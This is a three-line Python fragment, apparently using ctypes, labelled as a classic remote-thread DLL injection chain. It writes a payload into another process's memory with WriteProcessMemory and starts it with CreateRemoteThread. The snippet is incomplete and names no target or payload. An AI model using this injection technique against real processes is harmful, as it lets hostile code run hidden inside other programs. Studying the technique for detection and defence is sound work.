# Classic remote-thread DLL injection chain.
kernel32.WriteProcessMemory(handle, addr, payload, len(payload), 0)
kernel32.CreateRemoteThread(handle, None, 0, addr, 0, 0, 0)
